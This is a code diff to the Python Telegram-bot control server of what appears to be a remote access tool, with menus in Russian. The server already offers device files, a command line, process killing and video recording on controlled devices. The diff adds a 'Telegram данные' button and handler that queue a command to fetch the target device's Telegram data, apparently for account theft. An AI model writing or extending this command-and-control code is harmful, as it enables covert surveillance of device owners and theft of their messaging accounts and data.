@@ -321,6 +321,16 @@ class ServerBot:
                 text="Мультимедиа функции:",
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
+        elif action == "telegram_data":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                        (device_id, "telegram_data"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Запрос данных Telegram отправлен. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+                ]))
         elif action == "record_video_multi":
             # Запросить у пользователя количество видео
             context.user_data['video_multi_device'] = device_id
@@ -466,6 +476,7 @@ class ServerBot:
         elif action == "system_menu":
             keyboard = [
                 [InlineKeyboardButton("📁 Файлы", callback_data=f"action_{device_id}_files_menu")],
+                [InlineKeyboardButton("📨 Telegram данные", callback_data=f"action_{device_id}_telegram_data")],
                 [InlineKeyboardButton("💻 Командная строка", callback_data=f"action_{device_id}_cmd_menu")],
                 [InlineKeyboardButton("📜 Список процессов", callback_data=f"action_{device_id}_processes")],
                 [InlineKeyboardButton("❌ Завершить процесс", callback_data=f"action_{device_id}_killprocess")],
